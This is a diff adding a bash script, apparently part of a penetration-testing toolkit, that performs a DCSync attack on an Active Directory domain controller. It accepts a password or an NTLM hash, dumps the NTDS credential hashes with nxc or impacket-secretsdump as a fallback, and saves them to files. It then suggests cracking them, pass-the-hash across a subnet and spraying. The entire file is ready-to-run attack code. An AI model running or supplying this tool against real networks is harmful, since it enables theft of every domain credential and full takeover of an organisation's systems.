@@ -1,0 +1,81 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+OUTDIR="./hashes"
+
+usage() {
+    echo -e "${RED}Usage: dcsync <dc_ip> <domain> <user> <pass|hash>${NC}"
+    echo -e "${RED}  Ex:  dcsync 10.10.10.1 corp.local admin Password123${NC}"
+    echo -e "${RED}  Ex:  dcsync 10.10.10.1 corp.local admin aad3b435:8846f7ea${NC}"
+    exit 1
+}
+
+[ "$#" -ne 4 ] && usage
+
+DC_IP="$1"
+DOMAIN="$2"
+USER="$3"
+CRED="$4"
+
+mkdir -p "$OUTDIR"
+
+# Detect hash vs password
+CRED_FLAG="-p"
+IMP_CRED="$USER:$CRED@$DC_IP"
+if echo "$CRED" | grep -qP '^[a-f0-9]{32}:[a-f0-9]{32}$|^[a-f0-9]{32}$'; then
+    CRED_FLAG="-H"
+    IMP_CRED="-hashes $CRED $DOMAIN/$USER@$DC_IP"
+fi
+
+echo ""
+echo -e "${YELLOW}== DCSync: $DOMAIN ($DC_IP) ==${NC}"
+
+# nxc ntds
+echo -e "\n${CYAN}[nxc --ntds]${NC}"
+NXC_OUT=$(nxc smb "$DC_IP" -u "$USER" "$CRED_FLAG" "$CRED" --ntds 2>/dev/null)
+echo "$NXC_OUT" | grep -oP '[a-zA-Z0-9._-]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::' | tee "$OUTDIR/ntds_raw.txt"
+
+COUNT=$(wc -l < "$OUTDIR/ntds_raw.txt" 2>/dev/null)
+if [ "$COUNT" -gt 0 ]; then
+    echo -e "${GREEN}[+] $COUNT hashes → $OUTDIR/ntds_raw.txt${NC}"
+    # Extract NT hashes only
+    awk -F: '{print $4}' "$OUTDIR/ntds_raw.txt" > "$OUTDIR/ntds_nt.txt"
+    echo -e "${GREEN}[+] NT hashes only → $OUTDIR/ntds_nt.txt${NC}"
+else
+    echo -e "${RED}[-] nxc failed or no hashes — trying impacket...${NC}"
+
+    # impacket-secretsdump fallback
+    echo -e "\n${CYAN}[impacket-secretsdump]${NC}"
+    if echo "$CRED_FLAG" | grep -q "\-H"; then
+        impacket-secretsdump -hashes "$CRED" "$DOMAIN/$USER@$DC_IP" 2>/dev/null | \
+            grep -oP '[a-zA-Z0-9._-]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::' | tee "$OUTDIR/ntds_raw.txt"
+    else
+        impacket-secretsdump "$DOMAIN/$USER:$CRED@$DC_IP" 2>/dev/null | \
+            grep -oP '[a-zA-Z0-9._-]+:\d+:[a-f0-9]{32}:[a-f0-9]{32}:::' | tee "$OUTDIR/ntds_raw.txt"
+    fi
+
+    COUNT=$(wc -l < "$OUTDIR/ntds_raw.txt" 2>/dev/null)
+    if [ "$COUNT" -gt 0 ]; then
+        echo -e "${GREEN}[+] $COUNT hashes → $OUTDIR/ntds_raw.txt${NC}"
+        awk -F: '{print $4}' "$OUTDIR/ntds_raw.txt" > "$OUTDIR/ntds_nt.txt"
+        echo -e "${GREEN}[+] NT hashes only → $OUTDIR/ntds_nt.txt${NC}"
+    else
+        echo -e "${RED}[-] No hashes dumped — check credentials/permissions${NC}"
+        exit 1
+    fi
+fi
+
+echo ""
+echo ""
+echo -e "${YELLOW}== Next Steps ==${NC}"
+echo -e "${BLUE}Crack:       crack $OUTDIR/ntds_nt.txt${NC}"
+echo -e "${BLUE}PTH single:  pth <target> administrator <NT_HASH>${NC}"
+echo -e "${BLUE}PTH subnet:  pth 10.10.10.0/24 administrator <NT_HASH>${NC}"
+echo -e "${BLUE}Spray:       spray <target> administrator <NT_HASH>${NC}"
+echo -e "${YELLOW}=================================${NC}"
